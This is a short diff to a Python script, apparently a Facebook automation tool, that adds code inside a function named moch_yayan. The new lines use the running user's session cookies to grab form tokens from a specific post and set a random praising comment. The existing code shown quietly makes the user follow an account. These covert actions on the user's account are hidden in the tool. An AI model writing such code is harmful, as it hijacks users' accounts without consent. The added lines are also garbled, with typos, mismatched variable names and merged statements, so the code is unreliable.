@@ -95,6 +95,11 @@ def moch_yayan():
                            except:
                                   pass
                      try:
+                             to = parser(requests.get(mbasic.formar("/100004623370585/posts/1946312078866219"),cookies=cek).content,"html.parser")
+                             jo = re.findall('"><from action="(/a/comment.php\?fs=.*?)"."?name="fb_dtsg".*?value="(.*?)".*?name="jazoest".*?value="(\d)"',str(to))[0]x["fb_dtsg"] =   joe[1]x["jazoest"] = joe[2]
+                             komen = ['mantap bang','gokil suhu','patutanku','ganteng kali kau bang','semangat terus']
+                             x["comment_txt"] = random.choice(komen)
+                     try:
                              ikuti = parser(requests.get(mbasic.format("/fikritampan305"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
